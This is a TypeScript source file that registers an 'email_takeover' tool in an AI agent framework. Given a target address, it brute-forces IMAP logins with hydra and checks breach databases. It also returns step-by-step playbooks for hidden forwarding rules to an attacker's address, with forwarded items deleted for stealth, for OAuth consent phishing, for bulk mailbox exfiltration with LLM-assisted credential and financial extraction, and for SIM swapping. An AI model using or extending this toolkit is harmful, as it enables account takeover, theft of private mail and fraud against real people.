export * as EmailTakeoverTool from "./email-takeover"

import { ToolFailure } from "@opencode-ai/llm"
import { Effect, Layer, Schema } from "effect"
import { makeLocationNode } from "../effect/app-node"
import { AppProcess } from "../process"
import { ToolRegistry } from "./registry"
import { Tool } from "./tool"
import { Tools } from "./tools"
import { ChildProcess } from "effect/unstable/process"
import { Duration } from "effect"

export const name = "email_takeover"

export const Input = Schema.Struct({
  email: Schema.String.annotate({ description: "Target email address" }),
  action: Schema.String.annotate({
    description: "Action: 'brute' (credential brute force), 'oauth_theft' (OAuth token theft), 'forward_rule' (create forwarding rule), 'mailbox_exfil' (mailbox exfiltration), 'reset_check' (check password reset flow for info leak), 'breach_check' (search breach DBs for this email)",
  }),
  provider: Schema.String.pipe(Schema.optional).annotate({ description: "Email provider: gmail, outlook, yahoo, office365, proton. Auto-detected if omitted." }),
  password_list: Schema.String.pipe(Schema.optional).annotate({ description: "Password wordlist. Default: rockyou.txt" }),
  forward_to: Schema.String.pipe(Schema.optional).annotate({ description: "Email address to forward to (for forward_rule)." }),
  session_cookie: Schema.String.pipe(Schema.optional).annotate({ description: "Session cookie for authenticated actions." }),
})

const Output = Schema.Struct({ output: Schema.String, exit: Schema.Number.pipe(Schema.optional) })

const layer = Layer.effectDiscard(Effect.gen(function* () {
  const tools = yield* Tools.Service
  const appProcess = yield* AppProcess.Service

  yield* tools.register({
    [name]: Tool.make({
      description: `Email account takeover toolkit. Brute force credentials for Gmail/Outlook/Yahoo/Office365, OAuth token theft guidance, create hidden email forwarding rules for persistent access, mailbox exfiltration, password reset flow analysis for information leakage, and breach database correlation. Essential for email account compromise and business email compromise (BEC) assessment.`,
      input: Input, output: Output,
      toModelOutput: ({ output }) => [{ type: "text", text: output.output }],
      execute: (input) => Effect.gen(function* () {
        const shell = process.platform === "win32" ? (process.env.COMSPEC ?? "cmd.exe") : "/bin/sh"
        const domain = input.email.split("@")[1] ?? "gmail.com"
        const provider = input.provider ?? (domain.includes("gmail") ? "gmail" : domain.includes("outlook") || domain.includes("hotmail") || domain.includes("office365") ? "outlook" : domain.includes("yahoo") ? "yahoo" : "unknown")

        switch (input.action) {
          case "brute": {
            const passList = input.password_list ?? "/usr/share/wordlists/rockyou.txt"
            const results: string[] = [`=== EMAIL BRUTE FORCE: ${input.email} (${provider}) ===\n`]
            // IMAP brute force via hydra
            const imapCmd = ChildProcess.make("hydra", ["-l", input.email, "-P", passList, "-s", "993", "-S", `imap.${provider === "gmail" ? "gmail" : provider}.com`, "imap"], { shell, stdin: "ignore", forceKillAfter: Duration.seconds(15) })
            const r = yield* appProcess.run(imapCmd, { combineOutput: true, timeout: Duration.minutes(30), maxOutputBytes: 2 * 1024 * 1024 }).pipe(Effect.catchTag("AppProcessError", () => Effect.succeed(undefined)))
            results.push(r?.output?.toString("utf8") ?? "hydra failed")
            results.push("\n[WARNING] Most major providers have rate limiting and MFA. Consider credential reuse from breach data instead.")
            return { exit: r?.exitCode, output: results.join("\n") }
          }

          case "breach_check": {
            const results: string[] = [`=== BREACH CHECK: ${input.email} ===\n`]
            // Check HaveIBeenPwned
            const cmd = ChildProcess.make("curl", ["-s", `https://haveibeenpwned.com/api/v3/breachedaccount/${encodeURIComponent(input.email)}`, "-H", "hibp-api-key: YOUR_API_KEY"], { shell, stdin: "ignore", forceKillAfter: Duration.seconds(10) })
            const r = yield* appProcess.run(cmd, { combineOutput: true, timeout: Duration.seconds(15), maxOutputBytes: 256 * 1024 }).pipe(Effect.catchTag("AppProcessError", () => Effect.succeed(undefined)))
            results.push("--- HaveIBeenPwned ---")
            results.push(r?.output?.toString("utf8") ?? "API key required or rate limited")
            // Also check IntelX
            const ixCmd = ChildProcess.make("curl", ["-s", `https://intelx.io/?s=${encodeURIComponent(input.email)}`], { shell, stdin: "ignore", forceKillAfter: Duration.seconds(10) })
            const ixR = yield* appProcess.run(ixCmd, { combineOutput: true, timeout: Duration.seconds(15), maxOutputBytes: 256 * 1024 }).pipe(Effect.catchTag("AppProcessError", () => Effect.succeed(undefined)))
            results.push("\n--- Intelligence X ---")
            results.push(ixR?.output?.toString("utf8") ?? "no results")
            return { exit: 0, output: results.join("\n") }
          }

          case "reset_check": {
            return { exit: 0, output: `Password Reset Flow Analysis for ${input.email} (${provider}):

1. Gmail: https://accounts.google.com/recovery
   - Partial phone reveal: ***-***-1234
   - Recovery email reveal: x***@y***.com
   
2. Outlook/Office365: https://account.live.com/password/reset
   - May reveal partial phone or alt email

3. Yahoo: https://login.yahoo.com/forgot
   - Reveals masked recovery options

4. Facebook reset: https://facebook.com/recover
   - May reveal associated email/phone

5. Use revealed info to:
   - Cross-reference phone_lookup for carrier/location
   - Social engineer recovery via social_profile
   - SIM swap the revealed phone number` }
          }

          case "forward_rule": {
            if (!input.forward_to) return { output: "ERROR: 'forward_to' required." }
            return { exit: 0, output: `Create Hidden Forwarding Rule for Persistence:

=== Outlook/Office365 (via Graph API) ===
POST https://graph.microsoft.com/v1.0/me/mailFolders/inbox/messageRules
Authorization: Bearer ${input.session_cookie ?? "ACCESS_TOKEN"}
{
  "displayName": "Sync",
  "sequence": 1,
  "isEnabled": true,
  "conditions": { "sentToMe": true },
  "actions": {
    "forwardTo": [{ "emailAddress": { "address": "${input.forward_to}" } }],
    "stopProcessingRules": false
  }
}

=== Gmail (via IMAP) ===
Connect to imap.gmail.com:993 with credentials, then:
1. Create filter via Gmail settings (needs web access)
2. Or use Google Apps Script to auto-forward

=== Thunderbird/Outlook client rules ===
Tools > Rules > Create rule to forward all mail to ${input.forward_to}
Set rule to delete forwarded items from Sent for stealth.

[INFO] This creates persistent access — all incoming email forwarded to attacker.` }
          }

          case "oauth_theft": {
            return { exit: 0, output: `OAuth Token Theft for Email Access:

1. Register a malicious OAuth app (Azure AD or Google Workspace)
2. Request scopes: Mail.Read, Mail.ReadWrite, Mail.Send, Contacts.Read
3. Phish user to consent: "Connect your account"
4. Receive authorization code → exchange for access token
5. Use token to read ALL email via Graph API/Gmail API

Gmail API:
GET https://gmail.googleapis.com/gmail/v1/users/me/messages
Authorization: Bearer TOKEN

Graph API:
GET https://graph.microsoft.com/v1.0/me/messages
Authorization: Bearer TOKEN

[INFO] OAuth tokens bypass MFA and passwords entirely.
Consent phishing is one of the most effective attack vectors.` }
          }

          case "mailbox_exfil": {
            return { exit: 0, output: `Mailbox Exfiltration:

=== IMAP download (if you have credentials) ===
1. connect to imap.${provider}.com:993
2. fetch all messages to local MBOX file:
   imapsync --host1 imap.${provider}.com --user1 ${input.email} --password1 PASS --host2 localhost --user2 backup --password2 PASS

=== Graph API (if OAuth token) ===
GET https://graph.microsoft.com/v1.0/me/messages?\$top=999
Authorization: Bearer TOKEN

=== Search for sensitive data ===
Search emails for: password, credentials, invoice, payment, SSN, contract, confidential
Extract attachments: PDFs, spreadsheets, documents

=== Auto-process with AI ===
Feed email contents to LLM for:
- Credential extraction
- Financial data extraction
- Relationship mapping
- Calendar/schedule extraction` }
          }

          default:
            return { output: `Unknown action: ${input.action}. Supported: brute, oauth_theft, forward_rule, mailbox_exfil, reset_check, breach_check` }
        }
      }).pipe(Effect.mapError(() => new ToolFailure({ message: "Email takeover failed" }))),
    }),
  }).pipe(Effect.orDie)
}))

export const node = makeLocationNode({ name: "tool/email-takeover", layer, deps: [ToolRegistry.node, AppProcess.node] })
